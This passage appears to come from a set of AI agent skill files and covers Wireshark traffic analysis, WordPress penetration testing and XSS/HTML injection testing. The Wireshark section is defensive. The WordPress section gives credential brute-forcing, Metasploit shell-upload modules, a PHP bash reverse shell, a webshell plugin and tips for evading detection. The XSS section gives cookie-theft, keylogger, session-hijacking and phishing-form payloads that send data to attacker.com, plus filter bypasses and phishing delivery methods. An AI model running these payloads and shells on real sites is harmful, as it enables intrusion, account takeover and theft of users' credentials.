- Use slow brute-force: `-t 1 -w 5`
- Distribute attacks across IPs
- Use timing-based enumeration carefully
- Respect lockout thresholds

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
| Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |


---

<a id="wiresharkanalysis"></a>

## Wireshark Analysis

---
name: Wireshark Network Traffic Analysis
description: This skill should be used when the user asks to "analyze network traffic with Wireshark", "capture packets for troubleshooting", "filter PCAP files", "follow TCP/UDP streams", "detect network anomalies", "investigate suspicious traffic", or "perform protocol analysis". It provides comprehensive techniques for network packet capture, filtering, and analysis using Wireshark.
metadata:
  author: zebbern
  version: "1.1"
---

# Wireshark Network Traffic Analysis

## Purpose

Execute comprehensive network traffic analysis using Wireshark to capture, filter, and examine network packets for security investigations, performance optimization, and troubleshooting. This skill enables systematic analysis of network protocols, detection of anomalies, and reconstruction of network conversations from PCAP files.

## Inputs / Prerequisites

### Required Tools
- Wireshark installed (Windows, macOS, or Linux)
- Network interface with capture permissions
- PCAP/PCAPNG files for offline analysis
- Administrator/root privileges for live capture

### Technical Requirements
- Understanding of network protocols (TCP, UDP, HTTP, DNS)
- Familiarity with IP addressing and ports
- Knowledge of OSI model layers
- Understanding of common attack patterns

### Use Cases
- Network troubleshooting and connectivity issues
- Security incident investigation
- Malware traffic analysis
- Performance monitoring and optimization
- Protocol learning and education

## Outputs / Deliverables

### Primary Outputs
- Filtered packet captures for specific traffic
- Reconstructed communication streams
- Traffic statistics and visualizations
- Evidence documentation for incidents

## Core Workflow

### Phase 1: Capturing Network Traffic

#### Start Live Capture
Begin capturing packets on network interface:

```
1. Launch Wireshark
2. Select network interface from main screen
3. Click shark fin icon or double-click interface
4. Capture begins immediately
```

#### Capture Controls
| Action | Shortcut | Description |
|--------|----------|-------------|
| Start/Stop Capture | Ctrl+E | Toggle capture on/off |
| Restart Capture | Ctrl+R | Stop and start new capture |
| Open PCAP File | Ctrl+O | Load existing capture file |
| Save Capture | Ctrl+S | Save current capture |

#### Capture Filters
Apply filters before capture to limit data collection:

```
# Capture only specific host
host 192.168.1.100

# Capture specific port
port 80

# Capture specific network
net 192.168.1.0/24

# Exclude specific traffic
not arp

# Combine filters
host 192.168.1.100 and port 443
```

### Phase 2: Display Filters

#### Basic Filter Syntax
Filter captured packets for analysis:

```
# IP address filters
ip.addr == 192.168.1.1              # All traffic to/from IP
ip.src == 192.168.1.1               # Source IP only
ip.dst == 192.168.1.1               # Destination IP only

# Port filters
tcp.port == 80                       # TCP port 80
udp.port == 53                       # UDP port 53
tcp.dstport == 443                   # Destination port 443
tcp.srcport == 22                    # Source port 22
```

#### Protocol Filters
Filter by specific protocols:

```
# Common protocols
http                                  # HTTP traffic
https or ssl or tls                   # Encrypted web traffic
dns                                   # DNS queries and responses
ftp                                   # FTP traffic
ssh                                   # SSH traffic
icmp                                  # Ping/ICMP traffic
arp                                   # ARP requests/responses
dhcp                                  # DHCP traffic
smb or smb2                          # SMB file sharing
```

#### TCP Flag Filters
Identify specific connection states:

```
tcp.flags.syn == 1                   # SYN packets (connection attempts)
tcp.flags.ack == 1                   # ACK packets
tcp.flags.fin == 1                   # FIN packets (connection close)
tcp.flags.reset == 1                 # RST packets (connection reset)
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN-only (initial connection)
```

#### Content Filters
Search for specific content:

```
frame contains "password"            # Packets containing string
http.request.uri contains "login"    # HTTP URIs with string
tcp contains "GET"                   # TCP packets with string
```

#### Analysis Filters
Identify potential issues:

```
tcp.analysis.retransmission          # TCP retransmissions
tcp.analysis.duplicate_ack           # Duplicate ACKs
tcp.analysis.zero_window             # Zero window (flow control)
tcp.analysis.flags                   # Packets with issues
dns.flags.rcode != 0                 # DNS errors
```

#### Combining Filters
Use logical operators for complex queries:

```
# AND operator
ip.addr == 192.168.1.1 && tcp.port == 80

# OR operator
dns || http

# NOT operator
!(arp || icmp)

# Complex combinations
(ip.src == 192.168.1.1 || ip.src == 192.168.1.2) && tcp.port == 443
```

### Phase 3: Following Streams

#### TCP Stream Reconstruction
View complete TCP conversation:

```
1. Right-click on any TCP packet
2. Select Follow > TCP Stream
3. View reconstructed conversation
4. Toggle between ASCII, Hex, Raw views
5. Filter to show only this stream
```

#### Stream Types
| Stream | Access | Use Case |
|--------|--------|----------|
| TCP Stream | Follow > TCP Stream | Web, file transfers, any TCP |
| UDP Stream | Follow > UDP Stream | DNS, VoIP, streaming |
| HTTP Stream | Follow > HTTP Stream | Web content, headers |
| TLS Stream | Follow > TLS Stream | Encrypted traffic (if keys available) |

#### Stream Analysis Tips
- Review request/response pairs
- Identify transmitted files or data
- Look for credentials in plaintext
- Note unusual patterns or commands

### Phase 4: Statistical Analysis

#### Protocol Hierarchy
View protocol distribution:

```
Statistics > Protocol Hierarchy

Shows:
- Percentage of each protocol
- Packet counts
- Bytes transferred
- Protocol breakdown tree
```

#### Conversations
Analyze communication pairs:

```
Statistics > Conversations

Tabs:
- Ethernet: MAC address pairs
- IPv4/IPv6: IP address pairs
- TCP: Connection details (ports, bytes, packets)
- UDP: Datagram exchanges
```

#### Endpoints
View active network participants:

```
Statistics > Endpoints

Shows:
- All source/destination addresses
- Packet and byte counts
- Geographic information (if enabled)
```

#### Flow Graph
Visualize packet sequence:

```
Statistics > Flow Graph

Options:
- All packets or displayed only
- Standard or TCP flow
- Shows packet timing and direction
```

#### I/O Graphs
Plot traffic over time:

```
Statistics > I/O Graph

Features:
- Packets per second
- Bytes per second
- Custom filter graphs
- Multiple graph overlays
```

### Phase 5: Security Analysis

#### Detect Port Scanning
Identify reconnaissance activity:

```
# SYN scan detection (many ports, same source)
ip.src == SUSPECT_IP && tcp.flags.syn == 1

# Review Statistics > Conversations for anomalies
# Look for single source hitting many destination ports
```

#### Identify Suspicious Traffic
Filter for anomalies:

```
# Traffic to unusual ports
tcp.dstport > 1024 && tcp.dstport < 49152

# Traffic outside trusted network
!(ip.addr == 192.168.1.0/24)

# Unusual DNS queries
dns.qry.name contains "suspicious-domain"

# Large data transfers
frame.len > 1400
```

#### ARP Spoofing Detection
Identify ARP attacks:

```
# Duplicate ARP responses
arp.duplicate-address-frame

# ARP traffic analysis
arp

# Look for:
# - Multiple MACs for same IP
# - Gratuitous ARP floods
# - Unusual ARP patterns
```

#### Examine Downloads
Analyze file transfers:

```
# HTTP file downloads
http.request.method == "GET" && http contains "Content-Disposition"

# Follow HTTP Stream to view file content
# Use File > Export Objects > HTTP to extract files
```

#### DNS Analysis
Investigate DNS activity:

```
# All DNS traffic
dns

# DNS queries only
dns.flags.response == 0

# DNS responses only
dns.flags.response == 1

# Failed DNS lookups
dns.flags.rcode != 0

# Specific domain queries
dns.qry.name contains "domain.com"
```

### Phase 6: Expert Information

#### Access Expert Analysis
View Wireshark's automated findings:

```
Analyze > Expert Information

Categories:
- Errors: Critical issues
- Warnings: Potential problems
- Notes: Informational items
- Chats: Normal conversation events
```

#### Common Expert Findings
| Finding | Meaning | Action |
|---------|---------|--------|
| TCP Retransmission | Packet resent | Check for packet loss |
| Duplicate ACK | Possible loss | Investigate network path |
| Zero Window | Buffer full | Check receiver performance |
| RST | Connection reset | Check for blocks/errors |
| Out-of-Order | Packets reordered | Usually normal, excessive is issue |

## Quick Reference

### Keyboard Shortcuts
| Action | Shortcut |
|--------|----------|
| Open file | Ctrl+O |
| Save file | Ctrl+S |
| Start/Stop capture | Ctrl+E |
| Find packet | Ctrl+F |
| Go to packet | Ctrl+G |
| Next packet | ↓ |
| Previous packet | ↑ |
| First packet | Ctrl+Home |
| Last packet | Ctrl+End |
| Apply filter | Enter |
| Clear filter | Ctrl+Shift+X |

### Common Filter Reference
```
# Web traffic
http || https

# Email
smtp || pop || imap

# File sharing
smb || smb2 || ftp

# Authentication
ldap || kerberos

# Network management
snmp || icmp

# Encrypted
tls || ssl
```

### Export Options
```
File > Export Specified Packets    # Save filtered subset
File > Export Objects > HTTP       # Extract HTTP files
File > Export Packet Dissections   # Export as text/CSV
```

## Constraints and Guardrails

### Operational Boundaries
- Capture only authorized network traffic
- Handle captured data according to privacy policies
- Avoid capturing sensitive credentials unnecessarily
- Properly secure PCAP files containing sensitive data

### Technical Limitations
- Large captures consume significant memory
- Encrypted traffic content not visible without keys
- High-speed networks may drop packets
- Some protocols require plugins for full decoding

### Best Practices
- Use capture filters to limit data collection
- Save captures regularly during long sessions
- Use display filters rather than deleting packets
- Document analysis findings and methodology

## Examples

### Example 1: HTTP Credential Analysis

**Scenario**: Investigate potential plaintext credential transmission

```
1. Filter: http.request.method == "POST"
2. Look for login forms
3. Follow HTTP Stream
4. Search for username/password parameters
```

**Finding**: Credentials transmitted in cleartext form data.

### Example 2: Malware C2 Detection

**Scenario**: Identify command and control traffic

```
1. Filter: dns
2. Look for unusual query patterns
3. Check for high-frequency beaconing
4. Identify domains with random-looking names
5. Filter: ip.dst == SUSPICIOUS_IP
6. Analyze traffic patterns
```

**Indicators**:
- Regular timing intervals
- Encoded/encrypted payloads
- Unusual ports or protocols

### Example 3: Network Troubleshooting

**Scenario**: Diagnose slow web application

```
1. Filter: ip.addr == WEB_SERVER
2. Check Statistics > Service Response Time
3. Filter: tcp.analysis.retransmission
4. Review I/O Graph for patterns
5. Check for high latency or packet loss
```

**Finding**: TCP retransmissions indicating network congestion.

## Troubleshooting

### No Packets Captured
- Verify correct interface selected
- Check for admin/root permissions
- Confirm network adapter is active
- Disable promiscuous mode if issues persist

### Filter Not Working
- Verify filter syntax (red = error)
- Check for typos in field names
- Use Expression button for valid fields
- Clear filter and rebuild incrementally

### Performance Issues
- Use capture filters to limit traffic
- Split large captures into smaller files
- Disable name resolution during capture
- Close unnecessary protocol dissectors

### Cannot Decrypt TLS/SSL
- Obtain server private key
- Configure at Edit > Preferences > Protocols > TLS
- For ephemeral keys, capture pre-master secret from browser
- Some modern ciphers cannot be decrypted passively


---

<a id="wordpresspenetrationtesting"></a>

## Wordpress Penetration Testing

---
name: WordPress Penetration Testing
description: This skill should be used when the user asks to "pentest WordPress sites", "scan WordPress for vulnerabilities", "enumerate WordPress users, themes, or plugins", "exploit WordPress vulnerabilities", or "use WPScan". It provides comprehensive WordPress security assessment methodologies.
metadata:
  author: zebbern
  version: "1.1"
---

# WordPress Penetration Testing

## Purpose

Conduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.

## Prerequisites

### Required Tools
- WPScan (pre-installed in Kali Linux)
- Metasploit Framework
- Burp Suite or OWASP ZAP
- Nmap for initial discovery
- cURL or wget

### Required Knowledge
- WordPress architecture and structure
- Web application testing fundamentals
- HTTP protocol understanding
- Common web vulnerabilities (OWASP Top 10)

## Outputs and Deliverables

1. **WordPress Enumeration Report** - Version, themes, plugins, users
2. **Vulnerability Assessment** - Identified CVEs and misconfigurations
3. **Credential Assessment** - Weak password findings
4. **Exploitation Proof** - Shell access documentation

## Core Workflow

### Phase 1: WordPress Discovery

Identify WordPress installations:

```bash
# Check for WordPress indicators
curl -s http://target.com | grep -i wordpress
curl -s http://target.com | grep -i "wp-content"
curl -s http://target.com | grep -i "wp-includes"

# Check common WordPress paths
curl -I http://target.com/wp-login.php
curl -I http://target.com/wp-admin/
curl -I http://target.com/wp-content/
curl -I http://target.com/xmlrpc.php

# Check meta generator tag
curl -s http://target.com | grep "generator"

# Nmap WordPress detection
nmap -p 80,443 --script http-wordpress-enum target.com
```

Key WordPress files and directories:
- `/wp-admin/` - Admin dashboard
- `/wp-login.php` - Login page
- `/wp-content/` - Themes, plugins, uploads
- `/wp-includes/` - Core files
- `/xmlrpc.php` - XML-RPC interface
- `/wp-config.php` - Configuration (not accessible if secure)
- `/readme.html` - Version information

### Phase 2: Basic WPScan Enumeration

Comprehensive WordPress scanning with WPScan:

```bash
# Basic scan
wpscan --url http://target.com/wordpress/

# With API token (for vulnerability data)
wpscan --url http://target.com --api-token YOUR_API_TOKEN

# Aggressive detection mode
wpscan --url http://target.com --detection-mode aggressive

# Output to file
wpscan --url http://target.com -o results.txt

# JSON output
wpscan --url http://target.com -f json -o results.json

# Verbose output
wpscan --url http://target.com -v
```

### Phase 3: WordPress Version Detection

Identify WordPress version:

```bash
# WPScan version detection
wpscan --url http://target.com

# Manual version checks
curl -s http://target.com/readme.html | grep -i version
curl -s http://target.com/feed/ | grep -i generator
curl -s http://target.com | grep "?ver="

# Check meta generator
curl -s http://target.com | grep 'name="generator"'

# Check RSS feeds
curl -s http://target.com/feed/
curl -s http://target.com/comments/feed/
```

Version sources:
- Meta generator tag in HTML
- readme.html file
- RSS/Atom feeds
- JavaScript/CSS file versions

### Phase 4: Theme Enumeration

Identify installed themes:

```bash
# Enumerate all themes
wpscan --url http://target.com -e at

# Enumerate vulnerable themes only
wpscan --url http://target.com -e vt

# Theme enumeration with detection mode
wpscan --url http://target.com -e at --plugins-detection aggressive

# Manual theme detection
curl -s http://target.com | grep "wp-content/themes/"
curl -s http://target.com/wp-content/themes/
```

Theme vulnerability checks:
```bash
# Search for theme exploits
searchsploit wordpress theme <theme_name>

# Check theme version
curl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version
curl -s http://target.com/wp-content/themes/<theme>/readme.txt
```

### Phase 5: Plugin Enumeration

Identify installed plugins:

```bash
# Enumerate all plugins
wpscan --url http://target.com -e ap

# Enumerate vulnerable plugins only
wpscan --url http://target.com -e vp

# Aggressive plugin detection
wpscan --url http://target.com -e ap --plugins-detection aggressive

# Mixed detection mode
wpscan --url http://target.com -e ap --plugins-detection mixed

# Manual plugin discovery
curl -s http://target.com | grep "wp-content/plugins/"
curl -s http://target.com/wp-content/plugins/
```

Common vulnerable plugins to check:
```bash
# Search for plugin exploits
searchsploit wordpress plugin <plugin_name>
searchsploit wordpress mail-masta
searchsploit wordpress slideshow gallery
searchsploit wordpress reflex gallery

# Check plugin version
curl -s http://target.com/wp-content/plugins/<plugin>/readme.txt
```

### Phase 6: User Enumeration

Discover WordPress users:

```bash
# WPScan user enumeration
wpscan --url http://target.com -e u

# Enumerate specific number of users
wpscan --url http://target.com -e u1-100

# Author ID enumeration (manual)
for i in {1..20}; do
    curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
done

# JSON API user enumeration (if enabled)
curl -s http://target.com/wp-json/wp/v2/users

# REST API user enumeration
curl -s http://target.com/wp-json/wp/v2/users?per_page=100

# Login error enumeration
curl -X POST -d "log=admin&pwd=wrongpass" http://target.com/wp-login.php
```

### Phase 7: Comprehensive Enumeration

Run all enumeration modules:

```bash
# Enumerate everything
wpscan --url http://target.com -e at -e ap -e u

# Alternative comprehensive scan
wpscan --url http://target.com -e vp,vt,u,cb,dbe

# Enumeration flags:
# at - All themes
# vt - Vulnerable themes
# ap - All plugins
# vp - Vulnerable plugins
# u  - Users (1-10)
# cb - Config backups
# dbe - Database exports

# Full aggressive enumeration
wpscan --url http://target.com -e at,ap,u,cb,dbe \
    --detection-mode aggressive \
    --plugins-detection aggressive
```

### Phase 8: Password Attacks

Brute-force WordPress credentials:

```bash
# Single user brute-force
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# Multiple users from file
wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt

# With password attack threads
wpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50

# XML-RPC brute-force (faster, may bypass protection)
wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc

# Brute-force with API limiting
wpscan --url http://target.com -U admin -P passwords.txt --throttle 500

# Create targeted wordlist
cewl http://target.com -w wordlist.txt
wpscan --url http://target.com -U admin -P wordlist.txt
```

Password attack methods:
- `wp-login` - Standard login form
- `xmlrpc` - XML-RPC multicall (faster)
- `xmlrpc-multicall` - Multiple passwords per request

### Phase 9: Vulnerability Exploitation

#### Metasploit Shell Upload

After obtaining credentials:

```bash
# Start Metasploit
msfconsole

# Admin shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD jessica
set TARGETURI /wordpress
set LHOST <your_ip>
exploit
```

#### Plugin Exploitation

```bash
# Slideshow Gallery exploit
use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOSTS target.com
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD jessica
set LHOST <your_ip>
exploit

# Search for WordPress exploits
search type:exploit platform:php wordpress
```

#### Manual Exploitation

Theme/plugin editor (with admin access):

```php
// Navigate to Appearance > Theme Editor
// Edit 404.php or functions.php
// Add PHP reverse shell:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
?>

// Or use weevely backdoor
// Access via: http://target.com/wp-content/themes/theme_name/404.php
```

Plugin upload method:

```bash
# Create malicious plugin
cat > malicious.php << 'EOF'
<?php
/*
Plugin Name: Malicious Plugin
Description: Security Testing
Version: 1.0
*/
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF

# Zip and upload via Plugins > Add New > Upload Plugin
zip malicious.zip malicious.php

# Access webshell
curl "http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id"
```

### Phase 10: Advanced Techniques

#### XML-RPC Exploitation

```bash
# Check if XML-RPC is enabled
curl -X POST http://target.com/xmlrpc.php

# List available methods
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php

# Brute-force via XML-RPC multicall
cat > xmlrpc_brute.xml << 'EOF'
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>
EOF

curl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php
```

#### Scanning Through Proxy

```bash
# Use Tor proxy
wpscan --url http://target.com --proxy socks5://127.0.0.1:9050

# HTTP proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Burp Suite proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks
```

#### HTTP Authentication

```bash
# Basic authentication
wpscan --url http://target.com --http-auth admin:password

# Force SSL/TLS
wpscan --url https://target.com --disable-tls-checks
```

## Quick Reference

### WPScan Enumeration Flags

| Flag | Description |
|------|-------------|
| `-e at` | All themes |
| `-e vt` | Vulnerable themes |
| `-e ap` | All plugins |
| `-e vp` | Vulnerable plugins |
| `-e u` | Users (1-10) |
| `-e cb` | Config backups |
| `-e dbe` | Database exports |

### Common WordPress Paths

| Path | Purpose |
|------|---------|
| `/wp-admin/` | Admin dashboard |
| `/wp-login.php` | Login page |
| `/wp-content/uploads/` | User uploads |
| `/wp-includes/` | Core files |
| `/xmlrpc.php` | XML-RPC API |
| `/wp-json/` | REST API |

### WPScan Command Examples

| Purpose | Command |
|---------|---------|
| Basic scan | `wpscan --url http://target.com` |
| All enumeration | `wpscan --url http://target.com -e at,ap,u` |
| Password attack | `wpscan --url http://target.com -U admin -P pass.txt` |
| Aggressive | `wpscan --url http://target.com --detection-mode aggressive` |

## Constraints and Limitations

### Legal Considerations
- Obtain written authorization before testing
- Stay within defined scope
- Document all testing activities
- Follow responsible disclosure

### Technical Limitations
- WAF may block scanning
- Rate limiting may prevent brute-force
- Some plugins may have false negatives
- XML-RPC may be disabled

### Detection Evasion
- Use random user agents: `--random-user-agent`
- Throttle requests: `--throttle 1000`
- Use proxy rotation
- Avoid aggressive modes on monitored sites

## Troubleshooting

### WPScan Shows No Vulnerabilities

**Solutions:**
1. Use API token for vulnerability database
2. Try aggressive detection mode
3. Check for WAF blocking scans
4. Verify WordPress is actually installed

### Brute-Force Blocked

**Solutions:**
1. Use XML-RPC method instead of wp-login
2. Add throttling: `--throttle 500`
3. Use different user agents
4. Check for IP blocking/fail2ban

### Cannot Access Admin Panel

**Solutions:**
1. Verify credentials are correct
2. Check for two-factor authentication
3. Look for IP whitelist restrictions
4. Check for login URL changes (security plugins)


---

<a id="xsshtmlinjection"></a>

## Xss Html Injection

---
name: Cross-Site Scripting and HTML Injection Testing
description: This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploit client-side injection vulnerabilities", "steal cookies via XSS", or "bypass content security policies". It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.
metadata:
  author: zebbern
  version: "1.1"
---

# Cross-Site Scripting and HTML Injection Testing

## Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.

## Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

## Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations

## Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x    onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> → Check execution
2. Insert <img src=x onerror=alert(1)> → Check event handler
3. Insert "><script>alert(1)</script> → Test attribute escape
4. Insert javascript:alert(1) → Test href/src attributes
5. Check URL hash handling → DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```
